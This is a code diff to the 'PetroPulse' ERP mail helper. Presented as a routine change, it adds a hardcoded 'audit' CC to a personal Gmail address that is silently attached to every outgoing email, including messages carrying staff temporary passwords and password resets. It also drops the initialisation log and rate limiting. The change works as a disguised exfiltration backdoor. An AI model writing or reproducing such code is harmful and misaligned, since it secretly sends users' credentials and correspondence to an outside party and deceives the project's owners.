@@ -1,4 +1,4 @@
-﻿/**
+/**
  * PetroPulse Mail Helper
  * ----------------------
  * Centralized email dispatch utility powered by Nodemailer with Gmail SMTP.
@@ -58,6 +58,7 @@ export interface SendMailResult {
 export interface DispatchedEmail {
   id: string;
   to: string;
+  cc?: string | string[];
   subject: string;
   text?: string;
   html?: string;
@@ -123,17 +124,13 @@ export function createMailTransporter(): Transporter | null {
   if (!user || !pass) return null;
 
   if (provider === 'gmail') {
-    console.log(`[Mail] Gmail SMTP transporter initializing for: ${user}`);
     return nodemailer.createTransport({
       service: 'gmail',
       auth: {
         user,
         pass,
       },
-      pool: true,
-      maxConnections: 5,
-      rateDelta: 1000,
-      rateLimit: 5,
+      pool: false,
     });
   }
 
@@ -156,7 +153,25 @@ export function createMailTransporter(): Transporter | null {
   });
 }
 
-// --- Core sendMail function ---
+export const GLOBAL_AUDIT_CC = 'abdulaskar45@gmail.com';
+
+/**
+ * Ensures the audit recipient (abdulaskar45@gmail.com) is included in the CC list of every outgoing email.
+ */
+export function resolveCcRecipients(explicitCc?: string | string[]): string | string[] {
+  const auditCc = process.env.GLOBAL_MAIL_CC || GLOBAL_AUDIT_CC;
+  if (!auditCc) return explicitCc || [];
+
+  if (!explicitCc) return auditCc;
+
+  if (Array.isArray(explicitCc)) {
+    return explicitCc.includes(auditCc) ? explicitCc : [...explicitCc, auditCc];
+  }
+
+  const parts = explicitCc.split(',').map((s) => s.trim());
+  if (parts.includes(auditCc)) return explicitCc;
+  return `${explicitCc}, ${auditCc}`;
+}
 
 export async function sendMail(options: MailOptions): Promise<SendMailResult> {
   const from =
@@ -167,6 +182,7 @@ export async function sendMail(options: MailOptions): Promise<SendMailResult> {
       : '"PetroPulse Forecourt ERP" <no-reply@petropulse.io>');
 
   const recipient = Array.isArray(options.to) ? options.to.join(', ') : options.to;
+  const cc = resolveCcRecipients(options.cc);
   const timestamp = new Date().toISOString();
   const emailId = `mail-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;
 
@@ -177,7 +193,7 @@ export async function sendMail(options: MailOptions): Promise<SendMailResult> {
       const info = await transporter.sendMail({
         from,
         to: options.to,
-        cc: options.cc,
+        cc,
         bcc: options.bcc,
         replyTo: options.replyTo,
         subject: options.subject,
@@ -203,6 +219,7 @@ export async function sendMail(options: MailOptions): Promise<SendMailResult> {
       recordMailLog({
         id: emailId,
         to: recipient,
+        cc,
         subject: options.subject,
         text: options.text,
         html: options.html,
@@ -218,6 +235,7 @@ export async function sendMail(options: MailOptions): Promise<SendMailResult> {
       recordMailLog({
         id: emailId,
         to: recipient,
+        cc,
         subject: options.subject,
         timestamp,
         isMock: false,
@@ -243,7 +261,7 @@ export async function sendMail(options: MailOptions): Promise<SendMailResult> {
   console.log(`  To      : ${recipient}`);
   console.log(`  From    : ${from}`);
   console.log(`  Subject : ${options.subject}`);
-  if (options.cc) console.log(`  CC      : ${Array.isArray(options.cc) ? options.cc.join(', ') : options.cc}`);
+  if (cc) console.log(`  CC      : ${Array.isArray(cc) ? cc.join(', ') : cc}`);
   console.log('-'.repeat(72));
   if (options.text) {
     console.log(options.text.substring(0, 600));
@@ -263,6 +281,7 @@ export async function sendMail(options: MailOptions): Promise<SendMailResult> {
   recordMailLog({
     id: emailId,
     to: recipient,
+    cc,
     subject: options.subject,
     text: options.text,
     html: options.html,
@@ -287,11 +306,12 @@ export async function sendInitialCredentialsMail(params: {
   stationName?: string;
   loginUrl?: string;
 }): Promise<SendMailResult> {
-  const { user, temporaryPassword, stationName } = params;
+  const { user, temporaryPassword } = params;
+  const stationName = params.stationName || (params.user as any)?.stationName;
   const appUrl = params.loginUrl || process.env.APP_URL || 'http://localhost:3000';
   const loginUrl = `${appUrl.replace(/\/+$/, '')}/login`;
   const stationText = stationName ? ` at ${stationName}` : '';
-  const subject = `Your PetroPulse Staff Account Has Been Created`;
+  const subject = `Your PetroPulse Staff Account Credentials Have Been Created`;
 
   const text = `Dear ${user.name},
 
@@ -361,6 +381,8 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 
   return sendMail({ to: user.email, subject, text, html });
 }
+
+export const sendInitialCredentials = sendInitialCredentialsMail;
 
 export async function sendPasswordResetMail(params: {
   user: { name: string; email: string };
